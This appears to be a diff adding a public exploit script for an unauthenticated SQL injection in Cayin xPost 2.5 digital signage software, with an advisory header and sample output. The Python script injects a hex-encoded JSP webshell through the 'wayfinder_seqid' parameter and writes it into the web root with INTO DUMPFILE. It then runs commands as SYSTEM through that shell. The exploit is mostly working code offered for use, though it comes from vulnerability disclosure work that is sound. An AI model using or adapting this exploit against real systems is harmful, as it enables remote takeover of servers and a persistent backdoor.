@@ -1,0 +1,121 @@
+# Title: Cayin Digital Signage System xPost 2.5 - Remote Command Injection
+# Author:LiquidWorm
+# Date: 2020-06-04
+# Vendor: https://www.cayintech.com
+# CVE:  N/A
+
+#!/usr/bin/env python3
+#
+#
+# Cayin Digital Signage System xPost 2.5 Pre-Auth SQLi Remote Code Execution
+#
+#
+# Vendor: CAYIN Technology Co., Ltd.
+# Product web page: https://www.cayintech.com
+# Affected version: 2.5.18103
+#                   2.0
+#                   1.0
+#
+# Summary: CAYIN xPost is the web-based application software, which offers a
+# combination of essential tools to create rich contents for digital signage in
+# different vertical markets. It provides an easy-to-use platform for instant
+# data entry and further extends the usage of CAYIN SMP players to meet users'
+# requirements of frequent, daily maintenance.
+#
+# Desc: CAYIN xPost suffers from an unauthenticated SQL Injection vulnerability.
+# Input passed via the GET parameter 'wayfinder_seqid' in wayfinder_meeting_input.jsp
+# is not properly sanitised before being returned to the user or used in SQL queries.
+# This can be exploited to manipulate SQL queries by injecting arbitrary SQL code
+# and execute SYSTEM commands.
+#
+# --------------------------------------------------------------------------------
+# lqwrm@zslab:~$ python3 wayfinder.py 192.168.2.1:8888
+# # Injecting...
+# # Executing...
+#
+# Command: whoami
+#
+# nt authority\system
+#
+#
+# You have a webshell @ http://192.168.2.1:8888/thricer.jsp
+# lqwrm@zslab:~$
+# --------------------------------------------------------------------------------
+#
+# Tested on: Microsoft Windows 10 Home
+#            Microsoft Windows 8.1
+#            Microsoft Windows Server 2016
+#            Microsoft Windows Server 2012
+#            Microsoft Windows 7 Ultimate SP1
+#            Apache Tomcat/9.0.1
+#            MySQL/5.0
+#
+#
+# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+#                             @zeroscience
+#
+#
+# Advisory ID: ZSL-2020-5571
+# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2020-5571.php
+#
+#
+# 15.05.2020
+#
+
+import requests as req
+import time as vremeto
+import sys as sistemot
+import re as regularno
+
+if len(sistemot.argv) < 2:
+    print("Cayin xPost 2.5 Pre-Auth SQLi RCE")
+    print("Usage: ./wayfinder.py ip:port")
+    sistemot.exit(19)
+else:
+    ip = sistemot.argv[1]
+
+filename = "thricer.jsp"
+urlpath = "/cayin/wayfinder/wayfinder_meeting_input.jsp?wayfinder_seqid="
+constr = "-251' UNION ALL SELECT "
+
+print("# Injecting...")
+
+cmdjsp  = "0x3c2540207061676520696d706f72743d226a6176612e7574696c2e2a2c6a6176612"
+cmdjsp += "e696f2e2a22253e0a3c250a2f2f0a2f2f204a53505f4b49540a2f2f0a2f2f20636d64"
+cmdjsp += "2e6a7370203d20436f6d6d616e6420457865637574696f6e2028756e6978290a2f2f0"
+cmdjsp += "a2f2f2062793a20556e6b6e6f776e0a2f2f206d6f6469666965643a2032372f30362f"
+cmdjsp += "323030330a2f2f0a253e0a3c48544d4c3e3c424f44593e0a3c464f524d204d4554484"
+cmdjsp += "f443d2247455422204e414d453d226d79666f726d2220414354494f4e3d22223e0a3c"
+cmdjsp += "494e50555420545950453d227465787422204e414d453d22636d64223e0a3c494e505"
+cmdjsp += "55420545950453d227375626d6974222056414c55453d2253656e64223e0a3c2f464f"
+cmdjsp += "524d3e0a3c7072653e0a3c250a69662028726571756573742e676574506172616d657"
+cmdjsp += "465722822636d64222920213d206e756c6c29207b0a20202020202020206f75742e70"
+cmdjsp += "72696e746c6e2822436f6d6d616e643a2022202b20726571756573742e67657450617"
+cmdjsp += "2616d657465722822636d642229202b20223c42523e22293b0a202020202020202050"
+cmdjsp += "726f636573732070203d2052756e74696d652e67657452756e74696d6528292e65786"
+cmdjsp += "56328726571756573742e676574506172616d657465722822636d642229293b0a2020"
+cmdjsp += "2020202020204f757470757453747265616d206f73203d20702e6765744f757470757"
+cmdjsp += "453747265616d28293b0a2020202020202020496e70757453747265616d20696e203d"
+cmdjsp += "20702e676574496e70757453747265616d28293b0a202020202020202044617461496"
+cmdjsp += "e70757453747265616d20646973203d206e65772044617461496e7075745374726561"
+cmdjsp += "6d28696e293b0a2020202020202020537472696e672064697372203d206469732e726"
+cmdjsp += "561644c696e6528293b0a20202020202020207768696c652028206469737220213d20"
+cmdjsp += "6e756c6c2029207b0a202020202020202020202020202020206f75742e7072696e746"
+cmdjsp += "c6e2864697372293b200a2020202020202020202020202020202064697372203d2064"
+cmdjsp += "69732e726561644c696e6528293b200a202020202020202020202020202020207d0a2"
+cmdjsp += "0202020202020207d0a253e0a3c2f7072653e0a3c2f424f44593e3c2f48544d4c3e0a"
+cmdjsp += "0a0a"
+
+columns = ",NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL "
+sqlwrite = "INTO DUMPFILE 'C:/CayinApps/webapps/" + filename + "'-- -"
+mysqli = constr + cmdjsp + columns + sqlwrite
+r = req.get("http://" + ip + urlpath + mysqli, allow_redirects = True)
+vremeto.sleep(1)
+
+print("# Executing...")
+
+r = req.get("http://" + ip + "/" + filename + "?cmd=whoami")
+clean = regularno.compile("<pre>(.*)</pre>", flags = regularno.S).search(r.text)
+clean = clean.group(1).replace("<BR>", "\n")
+print(clean)
+print("You have a webshell @ http://" + ip + "/" + filename)
